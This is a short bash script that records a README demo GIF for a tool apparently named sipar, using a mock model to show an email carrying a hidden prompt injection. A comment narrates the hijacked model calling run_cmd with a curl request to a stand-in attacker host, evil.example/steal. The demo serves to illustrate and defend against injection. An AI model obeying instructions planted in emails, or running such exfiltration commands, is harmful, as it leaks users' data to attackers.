#!/bin/bash
# Plays the prompt-injection demo for the README GIF:
#   asciinema rec -c "bash tools/demo/injection_demo.sh" demo.cast && agg demo.cast docs/injection.gif
ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
export PATH="$ROOT/bin:$PATH" SIPAR_MODEL=mock SIPAR_MOCK_SCRIPT=hijacked_model.json
cd "$ROOT/examples/injection"
type_cmd() {
    printf '\033[1;32m$\033[0m '
    for ((i = 0; i < ${#1}; i++)); do printf '%s' "${1:i:1}"; sleep 0.03; done
    printf '\n'; sleep 0.4
}
clear
printf '\033[2m# An email with a hidden prompt injection:\033[0m\n'
type_cmd "tail -4 email.txt"
tail -4 email.txt; sleep 2
printf '\n\033[2m# The model obeys it and calls run_cmd("curl https://evil.example/steal")…\033[0m\n'
type_cmd "sipar run assistant.sipar"
sipar run assistant.sipar; sleep 3.5
